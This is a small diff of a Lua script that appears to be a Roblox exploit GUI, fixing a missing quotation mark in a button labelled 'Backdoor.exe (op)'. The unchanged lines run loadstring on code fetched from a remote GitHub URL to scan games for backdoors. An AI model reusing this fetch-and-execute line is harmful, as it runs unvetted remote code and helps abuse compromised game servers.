@@ -234,7 +234,7 @@ end)
 local Backdoor = Window:NewTab("Backdoor")
 local BackdoorSection = Backdoor:NewSection("Backdoor")
 
-BackdoorSection:NewButton("Backdoor.exe (op)", "Check backdoors and lets u use require scripts, function()
+BackdoorSection:NewButton("Backdoor.exe (op)", "Check backdoors and lets u use require scripts", function()
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
 end)
 
